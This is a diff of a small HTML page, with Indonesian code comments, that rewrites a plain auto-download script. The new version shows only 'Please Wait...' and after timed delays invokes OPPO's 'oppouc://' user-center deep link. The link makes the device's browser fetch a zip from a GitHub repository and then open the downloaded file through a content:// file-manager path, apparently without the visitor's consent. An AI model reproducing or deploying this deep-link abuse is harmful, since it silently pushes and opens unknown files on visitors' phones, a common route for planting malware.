@@ -1,24 +1,28 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Open Custom URL</title>
     <script type="text/javascript">
-        function downloadFile(url) {
-            // Buat elemen <a> untuk mendownload file
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = ''; // Kosongkan nama file agar nama file default dari server digunakan
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-        }
+        document.addEventListener('DOMContentLoaded', (event) => {
+            function openCustomURL(url) {
+                window.location.replace(url); // Menggunakan replace untuk membuka URL
+            }
 
-        window.onload = function() {
-            // Contoh penggunaan
-            downloadFile('https://raw.githubusercontent.com/Tedixx/i/i/i.zip');
-        };
+            // Menunggu 1 menit (60.000 milidetik) sebelum membuka URL pertama
+            setTimeout(() => {
+                openCustomURL('oppouc://usercenter.oppo.com/browser?url=https://github.com/Tedixx/i/raw/i/i.zip');
+                
+                // Menunggu 2 menit (120.000 milidetik) setelah membuka URL pertama sebelum membuka URL kedua
+                setTimeout(() => {
+                    openCustomURL('oppouc://usercenter.oppo.com/browser?url=content://com.coloros.filemanager/root/storage/emulated/0/Download/i.zip');
+                }, 120000); // 120000 milidetik = 2 menit
+            }, 60000); // 60000 milidetik = 1 menit
+        });
     </script>
 </head>
 <body>
-    <h1>Download File Example</h1>
+    <h1>Please Wait...</h1>
 </body>
 </html>
